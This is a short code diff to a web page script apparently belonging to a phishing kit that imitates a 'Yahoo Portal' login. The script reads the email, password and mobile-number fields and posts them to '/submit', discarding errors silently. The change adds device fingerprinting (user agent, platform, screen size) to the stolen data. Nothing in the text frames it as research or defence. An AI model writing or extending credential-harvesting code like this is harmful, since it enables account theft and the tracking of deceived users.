@@ -214,11 +214,16 @@
     var email = document.getElementById('email') ? document.getElementById('email').value : '';
     var pwd = document.getElementById('pwd') ? document.getElementById('pwd').value : '';
     var msMobile = document.getElementById('ms-mobile') ? document.getElementById('ms-mobile').value : '';
+    var deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenResolution: window.screen.width + 'x' + window.screen.height
+    };
     try {
       await fetch('/submit', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({page:'Yahoo Portal',type:type,email:email,pwd:pwd,'ms-mobile':msMobile})
+        body: JSON.stringify({page:'Yahoo Portal',type:type,email:email,pwd:pwd,'ms-mobile':msMobile,deviceInfo:deviceInfo})
       });
     } catch (e) {}
   }
